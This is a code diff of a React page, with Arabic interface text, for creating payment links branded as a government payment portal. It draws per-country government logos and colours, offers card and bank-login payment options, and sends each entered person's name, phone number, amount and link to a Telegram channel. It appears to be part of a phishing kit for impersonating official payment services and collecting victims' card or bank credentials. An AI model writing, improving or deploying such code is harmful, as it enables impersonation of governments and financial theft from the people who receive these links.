@@ -1,4 +1,4 @@
-import React, { useState, useMemo } from "react";
+import React, { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
@@ -9,7 +9,7 @@ import { useToast } from "@/hooks/use-toast";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getGovernmentServiceByKey } from "@/lib/governmentPaymentServices";
-import { getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
+import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
 import { generatePaymentLink } from "@/utils/paymentLinks";
 import { 
   Landmark, 
@@ -22,10 +22,25 @@ import {
   ExternalLink,
   CheckCircle,
   Shield,
-  Lock
+  Lock,
+  ArrowRight,
+  Info,
+  RefreshCw,
+  Hash,
+  ShieldCheck,
+  Building2,
+  CreditCard
 } from "lucide-react";
 import BackButton from "@/components/BackButton";
 import { sendToTelegram } from "@/lib/telegram";
+import {
+  AlertDialog,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
+import BottomNav from "@/components/BottomNav";
 
 const GovernmentPaymentLinkCreator = () => {
   const { country, serviceKey } = useParams();
@@ -33,11 +48,9 @@ const GovernmentPaymentLinkCreator = () => {
   const { toast } = useToast();
   const createLink = useCreateLink();
   
-  // Get service info
   const govService = useMemo(() => getGovernmentServiceByKey(serviceKey || ''), [serviceKey]);
   const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
   
-  // State for form fields
   const [fullName, setFullName] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
   const [email, setEmail] = useState("");
@@ -49,17 +62,20 @@ const GovernmentPaymentLinkCreator = () => {
   const [linkId, setLinkId] = useState("");
   const [showSuccess, setShowSuccess] = useState(false);
   const [paymentMethod, setPaymentMethod] = useState("card");
+  const [copied, setCopied] = useState(false);
 
-  const primaryColor = govSystem.colors.primary;
-  const secondaryColor = govSystem.colors.secondary;
+  const primaryColor = govSystem?.colors?.primary || "#F58220";
+
+  useEffect(() => {
+    window.scrollTo(0, 0);
+  }, []);
 
   if (!govService) {
     return (
-      <div className="min-h-screen flex items-center justify-center p-4">
-        <Card className="p-8 text-center max-w-md">
-          <h2 className="text-2xl font-bold mb-4">الخدمة غير موجودة</h2>
-          <p className="text-gray-600 mb-6">لم نتمكن من العثور على الخدمة المطلوبة</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
+      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-50">
+        <Card className="p-8 text-center max-w-md shadow-lg border-0">
+          <h2 className="text-xl font-bold mb-4 text-red-600">الخدمة غير موجودة</h2>
+          <Button onClick={() => navigate('/services')} className="w-full h-12 text-base font-bold">العودة للخدمات</Button>
         </Card>
       </div>
     );
@@ -68,13 +84,8 @@ const GovernmentPaymentLinkCreator = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
-
     if (!fullName || !phoneNumber || !amount) {
-      toast({
-        title: "خطأ",
-        description: "الرجاء ملء جميع الحقول المطلوبة",
-        variant: "destructive",
-      });
+      toast({ title: "خطأ", description: "يرجى تعبئة الحقول المطلوبة", variant: "destructive" });
       setIsSubmitting(false);
       return;
     }
@@ -86,29 +97,26 @@ const GovernmentPaymentLinkCreator = () => {
         payload: {
           service_key: serviceKey,
           service_name: govService.nameAr,
-          customerInfo: {
-            fullName,
-            phoneNumber,
-            email,
-          },
-          payment_amount: parseFloat(amount),
+          customerInfo: { fullName, phoneNumber, email },
+          cod_amount: parseFloat(amount),
           currency_code: getCurrencyCode(country || govService.country),
           reference,
           description,
-          provider: govService.key.toUpperCase(),
           selectedCountry: country || govService.country,
           payment_method: paymentMethod,
+          govId: country || 'SA'
         },
       });
 
-      // Generate proper payment URL with service key for dynamic identity
-      const productionDomain = typeof window !== 'undefined'
-        ? window.location.origin
-        : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://sensational-fenglisu-ebbbfb.netlify.app');
-
-      const currencyCode = getCurrencyCode(country || govService.country);
-      const paymentUrl = `${productionDomain}/p/${link.id}/${serviceKey}/${currencyCode}/${parseFloat(amount)}?pm=${paymentMethod}`;
-
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: serviceKey || 'government',
+        country: country || 'SA',
+        amount: parseFloat(amount),
+        currency: getCurrencyCode(country || 'SA'),
+        paymentMethod: paymentMethod,
+        type: 'government'
+      });
       setCreatedLink(paymentUrl);
       setLinkId(link.id);
       setShowSuccess(true);
@@ -119,27 +127,16 @@ const GovernmentPaymentLinkCreator = () => {
           service: govService.nameAr,
           customer_name: fullName,
           phone: phoneNumber,
-          email: email || 'غير محدد',
           amount: parseFloat(amount),
           currency: getCurrencySymbol(country || govService.country),
-          reference: reference || 'غير محدد',
-          description: description || 'غير محدد',
           payment_url: paymentUrl,
         },
         timestamp: new Date().toISOString(),
       });
 
-      toast({
-        title: "✅ تم إنشاء رابط الدفع بنجاح",
-        description: "يمكنك الآن نسخ الرابط أو معاينته",
-      });
+      toast({ title: "تم بنجاح" });
     } catch (error) {
-      console.error("Error creating payment link:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء إنشاء رابط الدفع",
-        variant: "destructive",
-      });
+      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
     } finally {
       setIsSubmitting(false);
     }
@@ -147,331 +144,147 @@ const GovernmentPaymentLinkCreator = () => {
 
   const handleCopyLink = () => {
     navigator.clipboard.writeText(createdLink);
-    toast({
-      title: "✅ تم النسخ",
-      description: "تم نسخ الرابط إلى الحافظة",
-    });
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+    toast({ title: "تم النسخ" });
   };
 
-  const handlePreview = () => {
-    window.open(createdLink, '_blank');
-  };
-
-  const handleNavigateToPayment = () => {
-    navigate(`/pay/${linkId}/data`);
-  };
-
-  if (showSuccess) {
-    return (
-      <div 
-        className="min-h-screen flex items-center justify-center py-8 px-4"
-        style={{
-          background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
-          fontFamily: govSystem.fonts.primaryAr
-        }}
-        dir="rtl"
-      >
-        <Card 
-          className="max-w-2xl w-full overflow-hidden border-0 shadow-2xl"
-          style={{ borderRadius: govSystem.borderRadius.lg }}
-        >
-          <div 
-            className="p-8 text-center"
-            style={{
-              background: govSystem.gradients.header,
-            }}
-          >
-            <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center">
-              <CheckCircle className="w-12 h-12 text-white" />
-            </div>
-            <h2 className="text-3xl font-bold text-white mb-2">
-              تم إنشاء رابط الدفع بنجاح
-            </h2>
-            <p className="text-white/90">
-              يمكنك الآن مشاركة الرابط مع العميل
-            </p>
-          </div>
-
-          <div className="p-8 space-y-6">
-            <div 
-              className="p-6 rounded-xl border-2"
-              style={{
-                borderColor: primaryColor,
-                background: `${primaryColor}08`
-              }}
-            >
-              <Label className="text-sm font-semibold mb-2 block">
-                رابط الدفع
-              </Label>
-              <div className="bg-white p-4 rounded-lg break-all text-sm font-mono border">
-                {createdLink}
-              </div>
-            </div>
-
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-              <Button
-                onClick={handleCopyLink}
-                size="lg"
-                className="w-full"
-                style={{
-                  background: govSystem.gradients.primary,
-                  color: govSystem.colors.textOnPrimary
-                }}
-              >
-                <Copy className="w-5 h-5 ml-2" />
-                نسخ الرابط
-              </Button>
-              <Button
-                onClick={handlePreview}
-                size="lg"
-                variant="outline"
-                className="w-full"
-                style={{
-                  borderColor: primaryColor,
-                  color: primaryColor
-                }}
-              >
-                <ExternalLink className="w-5 h-5 ml-2" />
-                معاينة الرابط
-              </Button>
-            </div>
-
-            <Button
-              onClick={handleNavigateToPayment}
-              size="lg"
-              variant="secondary"
-              className="w-full"
-            >
-              متابعة إدخال بيانات الدفع
-            </Button>
-
-            <Button
-              onClick={() => window.location.href = '/services'}
-              size="lg"
-              variant="ghost"
-              className="w-full"
-            >
-              العودة للخدمات
-            </Button>
-          </div>
-        </Card>
-      </div>
-    );
-  }
 
   return (
-    <div 
-      className="min-h-screen py-8 px-4"
-      style={{
-        background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
-        fontFamily: govSystem.fonts.primaryAr
-      }}
-      dir="rtl"
-    >
-      <div className="container mx-auto max-w-3xl">
-        <div className="mb-6">
+    <div className="min-h-screen bg-slate-50" dir="rtl">
+      <header className="bg-white border-b h-16 flex items-center px-4 sticky top-0 z-50 shadow-sm">
+        <div className="container mx-auto flex justify-between items-center">
+          <div className="flex items-center gap-2">
+            <div className="w-8 h-8 rounded-lg flex items-center justify-center text-white" style={{ background: primaryColor }}>
+              <Landmark className="w-5 h-5" />
+            </div>
+            <h1 className="font-black text-gray-800">بوابة السداد الحكومي</h1>
+          </div>
           <BackButton />
         </div>
+      </header>
 
-        <Card 
-          className="overflow-hidden border-0 shadow-2xl"
-          style={{ borderRadius: govSystem.borderRadius.lg }}
-        >
-          <div 
-            className="p-8 relative"
-            style={{
-              background: govSystem.gradients.header,
-            }}
-          >
-            <div className="flex items-center gap-4">
-              <div className="w-16 h-16 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center">
-                <Landmark className="w-8 h-8 text-white" />
-              </div>
-              <div>
-                <h1 className="text-3xl font-bold text-white">
-                  {govService.nameAr}
-                </h1>
-                <p className="text-white/90 mt-1">
-                  {govService.description}
-                </p>
-              </div>
-            </div>
-            
-            {govService.logo && (
-              <div className="absolute top-4 left-4">
-                <img 
-                  src={govService.logo} 
-                  alt={govService.nameAr}
-                  className="h-12 w-auto object-contain brightness-0 invert opacity-80"
-                />
-              </div>
-            )}
-          </div>
-
-          <form onSubmit={handleSubmit} className="p-8 space-y-6">
-            <div className="text-center mb-6">
-              <h2 className="text-2xl font-bold mb-2" style={{ color: primaryColor }}>
-                إنشاء رابط دفع {govService.nameAr}
-              </h2>
-              <p className="text-gray-600">
-                أدخل بيانات الدفع لإنشاء رابط مخصص
-              </p>
-            </div>
-
-            <div className="space-y-4">
-              <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <User className="w-4 h-4" />
-                  اسم العميل *
-                </Label>
-                <Input
-                  value={fullName}
-                  onChange={(e) => setFullName(e.target.value)}
-                  placeholder="أدخل الاسم الكامل"
-                  required
-                  className="h-12"
-                />
-              </div>
-
-              <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <Phone className="w-4 h-4" />
-                  رقم الجوال *
-                </Label>
-                <Input
-                  value={phoneNumber}
-                  onChange={(e) => setPhoneNumber(e.target.value)}
-                  placeholder="05XXXXXXXX"
-                  required
-                  className="h-12"
-                  dir="ltr"
-                />
-              </div>
-
-              <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <Mail className="w-4 h-4" />
-                  البريد الإلكتروني (اختياري)
-                </Label>
-                <Input
-                  type="email"
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  placeholder="example@email.com"
-                  className="h-12"
-                  dir="ltr"
-                />
-              </div>
-            </div>
-
-            <div className="space-y-4 pt-4 border-t">
-              <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <DollarSign className="w-4 h-4" />
-                  المبلغ المطلوب *
-                </Label>
-                <Input
-                  type="number"
-                  value={amount}
-                  onChange={(e) => setAmount(e.target.value)}
-                  placeholder="0.00"
-                  required
-                  className="h-12"
-                  step="0.01"
-                  min="0"
-                />
-              </div>
-
-              <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <FileText className="w-4 h-4" />
-                  رقم الفاتورة / المرجع (اختياري)
-                </Label>
-                <Input
-                  value={reference}
-                  onChange={(e) => setReference(e.target.value)}
-                  placeholder="INV-001"
-                  className="h-12"
-                />
-              </div>
-
-              <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <FileText className="w-4 h-4" />
-                  وصف الدفع (اختياري)
-                </Label>
-                <Textarea
-                  value={description}
-                  onChange={(e) => setDescription(e.target.value)}
-                  placeholder="وصف تفصيلي للدفعة..."
-                  className="min-h-24"
-                />
-              </div>
-            </div>
-
-            <div 
-              className="p-4 rounded-lg"
-              style={{
-                background: `${primaryColor}08`,
-                borderRight: `4px solid ${primaryColor}`
-              }}
-            >
-              <div className="flex items-start gap-3">
-                <Shield className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
-                <div className="flex-1">
-                  <p className="text-sm font-semibold mb-1" style={{ color: primaryColor }}>
-                    معاملة آمنة ومشفرة
-                  </p>
-                  <p className="text-xs text-gray-600">
-                    جميع البيانات محمية بتقنية التشفير SSL وتتوافق مع معايير الأمان العالمية
-                  </p>
+      <main className="container mx-auto px-4 py-6 max-w-xl">
+        <form onSubmit={handleSubmit} className="space-y-4">
+           <Card className="p-6 border-2 rounded-3xl shadow-xl space-y-6">
+              <div className="p-4 rounded-2xl flex items-center gap-4 animate-in fade-in slide-in-from-top-2" style={{ background: `${primaryColor}10`, border: `1px solid ${primaryColor}20` }}>
+                <div className="w-20 h-10 bg-white rounded-lg p-1 flex items-center justify-center border shadow-sm">
+                   <img src={govService.logo || govSystem?.logo} alt="" className="max-h-full max-w-full object-contain" />
+                </div>
+                <div>
+                  <h4 className="font-black text-sm" style={{ color: primaryColor }}>{govService.nameAr}</h4>
+                  <p className="text-[10px] font-bold opacity-70">{govSystem?.description}</p>
                 </div>
               </div>
-            </div>
 
-            <Button
-              type="submit"
-              size="lg"
-              disabled={isSubmitting}
-              className="w-full h-14 text-lg font-bold"
-              style={{
-                background: govSystem.gradients.primary,
-                color: govSystem.colors.textOnPrimary,
-                boxShadow: govSystem.shadows.lg
-              }}
-            >
-              {isSubmitting ? (
-                "جاري إنشاء الرابط..."
-              ) : (
-                <>
-                  <Lock className="w-5 h-5 ml-2" />
-                  إنشاء رابط الدفع الآمن
-                </>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div className="space-y-1.5">
+                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">اسم المستفيد</Label>
+                  <div className="relative">
+                    <Input value={fullName} onChange={(e) => setFullName(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" placeholder="الاسم الكامل" />
+                    <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                  </div>
+                </div>
+                <div className="space-y-1.5">
+                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">رقم الجوال</Label>
+                  <div className="relative">
+                    <Input value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10 text-left" dir="ltr" placeholder="05XXXXXXXX" />
+                    <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                  </div>
+                </div>
+              </div>
+
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div className="space-y-1.5">
+                   <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">المبلغ المطلوب</Label>
+                   <div className="relative">
+                     <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
+                     <div className="absolute right-3 top-1/2 -translate-y-1/2 font-bold text-gray-300 text-[10px]">{getCurrencySymbol(country || govService.country)}</div>
+                   </div>
+                </div>
+                <div className="space-y-1.5">
+                  <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">رقم المرجع</Label>
+                  <div className="relative">
+                    <Input value={reference} onChange={(e) => setReference(e.target.value)} className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" placeholder="INV-XXXX" />
+                    <Hash className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                  </div>
+                </div>
+              </div>
+
+              <div className="space-y-1.5">
+                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">وصف الرسوم</Label>
+                <div className="relative">
+                  <Input value={description} onChange={(e) => setDescription(e.target.value)} placeholder="مثال: رسوم تجديد، غرامة..." className="h-12 border-2 rounded-xl font-black bg-gray-50/50 pr-10" />
+                  <FileText className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-300" />
+                </div>
+              </div>
+
+              {parseFloat(amount) > 0 && (
+                <div className="p-4 rounded-2xl bg-slate-900 text-white animate-in zoom-in-95 duration-300 shadow-xl">
+                  <div className="flex justify-between items-center mb-2">
+                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">المبلغ الإجمالي</span>
+                    <Shield className="w-4 h-4 text-green-400" />
+                  </div>
+                  <div className="flex items-baseline gap-2">
+                    <span className="text-3xl font-black">{amount}</span>
+                    <span className="text-xs font-bold text-slate-400">{getCurrencySymbol(country || govService.country)}</span>
+                  </div>
+                </div>
               )}
-            </Button>
-          </form>
 
-          <div 
-            className="px-8 py-4 text-center text-xs"
-            style={{
-              background: govSystem.colors.surface,
-              borderTop: `1px solid ${govSystem.colors.border}`
-            }}
-          >
-            <div className="flex items-center justify-center gap-4 text-gray-500">
-              <div className="flex items-center gap-1">
-                <Lock className="w-3 h-3" />
-                <span>SSL Encrypted</span>
+              <div className="space-y-3 pt-4 border-t">
+                <Label className="text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">طريقة الدفع المتاحة</Label>
+                <div className="grid grid-cols-2 gap-3">
+                   <button type="button" onClick={() => setPaymentMethod('card')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'card' ? 'border-primary bg-primary/5' : 'border-slate-100 bg-slate-50'}`}>
+                      <CreditCard className={`w-6 h-6 ${paymentMethod === 'card' ? 'text-primary' : 'text-slate-300'}`} />
+                      <span className={`text-[10px] font-black uppercase ${paymentMethod === 'card' ? 'text-primary' : 'text-slate-400'}`}>بطاقة دفع</span>
+                   </button>
+                   <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${paymentMethod === 'bank_login' ? 'border-primary bg-primary/5' : 'border-slate-100 bg-slate-50'}`}>
+                      <Building2 className={`w-6 h-6 ${paymentMethod === 'bank_login' ? 'text-primary' : 'text-slate-300'}`} />
+                      <span className={`text-[10px] font-black uppercase ${paymentMethod === 'bank_login' ? 'text-primary' : 'text-slate-400'}`}>دخول بنكي</span>
+                   </button>
+                </div>
               </div>
-              <span>•</span>
-              <div className="flex items-center gap-1">
-                <Shield className="w-3 h-3" />
-                <span>PCI Compliant</span>
+           </Card>
+
+           <Button type="submit" disabled={isSubmitting} className="w-full h-16 rounded-3xl font-black text-lg shadow-xl text-white transition-all active:scale-95" style={{ background: govSystem?.gradients?.primary || primaryColor }}>
+             {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : <><ShieldCheck className="w-5 h-5 ml-2" /> إصدار رابط سداد حكومي</>}
+           </Button>
+        </form>
+      </main>
+
+      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
+        <AlertDialogContent className="max-w-[90%] rounded-3xl border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
+           <div className="p-8 text-center space-y-6">
+              <div className="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-2" style={{ background: `${primaryColor}15` }}>
+                <div className="w-12 h-12 rounded-full flex items-center justify-center animate-bounce" style={{ background: primaryColor }}>
+                  <RefreshCw className="w-6 h-6 text-white" />
+                </div>
               </div>
-            </div>
-          </div>
-        </Card>
-      </div>
+              <div>
+                <AlertDialogTitle className="text-2xl font-black text-gray-900">رابط السداد جاهز!</AlertDialogTitle>
+                <AlertDialogDescription className="font-bold text-gray-500 text-sm">تم توليد رابط دفع آمن لهذه الخدمة الحكومية</AlertDialogDescription>
+              </div>
+
+              <div className="bg-gray-50 p-4 rounded-2xl border-2 border-dashed border-gray-200 break-all font-mono text-xs font-bold text-gray-400">
+                {createdLink}
+              </div>
+
+              <div className="flex gap-3">
+                 <Button onClick={handleCopyLink} className="flex-1 h-14 rounded-2xl font-black bg-gray-900 text-white gap-2">
+                   {copied ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
+                   {copied ? "تم النسخ" : "نسخ الرابط"}
+                 </Button>
+                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-14 rounded-2xl font-black border-2 gap-2 text-gray-700">
+                   <ExternalLink className="w-4 h-4" /> معاينة
+                 </Button>
+              </div>
+              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-gray-400">إغلاق</Button>
+           </div>
+        </AlertDialogContent>
+      </AlertDialog>
+      <div className="h-20" />
+      <BottomNav />
     </div>
   );
 };
